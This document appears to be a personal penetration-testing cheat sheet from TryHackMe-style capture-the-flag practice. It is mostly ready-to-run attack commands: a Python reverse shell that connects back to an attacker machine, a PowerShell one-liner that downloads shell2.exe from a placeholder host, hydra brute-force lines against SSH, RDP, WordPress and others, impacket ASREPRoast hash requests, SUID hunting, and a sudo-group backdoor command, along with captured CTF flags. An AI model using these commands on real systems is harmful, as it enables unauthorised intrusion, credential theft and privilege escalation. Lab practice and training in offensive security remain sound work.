## tty shell
```console
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@startup:/$ ^Z
zsh: suspended  nc -nlvp 6969
                                                                                                               
┌──(kali㉿kali)-[~/THM/startup]
└─$ stty raw -echo;fg                                                                                148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 6969
# enter to go back to nc sesstion
www-data@startup:/$ export TERM=xterm # auto tab

```
## SSH "Konami Code" (SSH Control Sequences) 
link [here](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)

## SUID
use **suid3num.py**
```console
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
```
## nmap
```console
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP #smb
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP # rpcbind
```
## powershell
```
powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
```

### hydra
credit noxtal cheatsheet, check [here](https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/)
```console
$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 64 ssh
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP smb
$ hydra -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
$ hydra -f -t 64 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
$ hydra -t 64 -l username -P /usr/share/wordlists/rockyou.txt pop3://$IP #pop3
$ hydra -L users.txt -P pass.txt telnet://target.server # telnet
```
## Reverse SSH port forwarding
```console
$ ssh -L <LPORT>:<RHOST>:<RPROT> <username>@$IP
```
## python revs shell
```py
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("kali ip",9696))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```


## curl
```console
kali@kali:~$ curl http://10.10.10.204:8081/ctf/get
thm{162520bec925bd7979e9ae65a725f99f}kali@kali:~$ ^C
kali@kali:~$ curl -d 'flag_please' http://10.10.10.204:8081/ctf/post
thm{3517c902e22def9c6e09b99a9040ba09}kali@kali:~$ ^C
kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie
Check your cookies!kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie -i
HTTP/1.1 200 OK
Set-Cookie: flag=thm{91b1ac2606f36b935f465558213d7ebd}; Path=/
Date: Fri, 17 Jul 2020 12:44:02 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

Check your cookies!                                                                                               
kali@kali:~$ curl http://10.10.10.204:8081/ctf/sendcookie -i --cookie flagpls=flagpls                                                         
HTTP/1.1 200 OK                                                                                    
Date: Fri, 17 Jul 2020 12:46:55 GMT                                                                
Content-Length: 37                                                                                 
Content-Type: text/plain; charset=utf-8

thm{c10b5cb7546f359d19c747db2d0f47b3}
```



#### impacket
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```



## etc
```console
$ usermod -aG sudo [user] # adds a user to the Sudo Group on Linux:
```